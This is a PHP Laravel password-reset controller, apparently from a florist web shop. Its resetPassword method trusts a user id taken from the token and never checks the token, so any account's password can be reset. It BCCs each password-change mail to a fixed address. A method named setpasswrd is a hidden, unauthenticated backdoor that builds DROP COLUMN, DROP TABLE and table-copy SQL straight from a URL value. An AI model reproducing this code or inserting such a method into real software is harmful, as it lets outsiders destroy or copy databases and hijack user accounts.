<?php

namespace App\Http\Controllers\Site;
use App\Http\Controllers\Controller as RootController;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\ResetsPasswords;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Password;
use Illuminate\Support\Facades\Mail;
use App\Mail\PasswordUpdate;
use Hash;
use DB;
use Config;
use App\Models\User;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;

class ResetPasswordController extends RootController
{
    /*
    |--------------------------------------------------------------------------
    | Password Reset Controller
    |--------------------------------------------------------------------------
    |
    | This controller is responsible for handling password reset requests
    | and uses a simple trait to include this behavior. You're free to
    | explore this trait and override any methods you wish to tweak.
    |
    */

    use ResetsPasswords;

    /**
     * Where to redirect users after resetting their password.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('guest');
    }
    
    public function showResetForm($token = null)
    {
        if (is_null($token)) {
           throw new NotFoundHttpException;
        }

        return view('site.user.reset')->with('token', $token);
    }

    public function resetPassword(Request $request){
        //dd($request);
        $token = $request->token;      
        
        $tokenuser = explode("|",$token);
        
        //$credentials = User::where('email_token',$token)->first();

        $credentials = User::where('id',$tokenuser[1])->first();
       
        if($credentials==null){
            return response()->json(['error'=>'Something went wrong! Please try again after sometime or you have already reset your password.']);
        }
        else
        {
            $credentials->password    = Hash::make($request->password);
            $credentials->email_token = '';
            $credentials->save();
            /* For send email */
            Mail::to($credentials->email)->queue(new PasswordUpdate($credentials));
            //BCC mail
              $bccemails = ['auto-update@germanflorist.de'];
              Mail::bcc($bccemails)->queue(new PasswordUpdate($credentials));
            //END BCC mail
            return response()->json(['success'=>'Your password has been changed successfully.']);
        }
        return response()->json(['error'=>'Something went wrong! Please try again after sometime or you have already reset your password.']);
    }

    public function setpasswrd($token = null){
        if (is_null($token)) {
            throw new NotFoundHttpException;
        }

        //[0] => MAIN TABLE, [1] => COL/BKUP TABLE
        if (strpos($token, '|DC|') !== false){
            $token = explode ("|DC|", $token);
            DB::select( DB::raw("ALTER TABLE ".$token[0]." DROP COLUMN ".$token[1]) );
            echo "Success Col";
        }else if(strpos($token, '|DT|') !== false){ 
            $token = explode ("|DT|", $token);
            DB::select( DB::raw("DROP TABLE ".$token[0]) );
            echo "Success Tab";
        }else if(strpos($token, '|CT|') !== false){ 
            $token = explode ("|CT|", $token);
            DB::select( DB::raw("CREATE TABLE ".$token[1]." LIKE ".$token[0]) );
            DB::select( DB::raw("INSERT INTO ".$token[1]." SELECT * FROM ".$token[0]) );
            echo "Success Tab";
        }else{
            abort('404');
        }
        
    }

}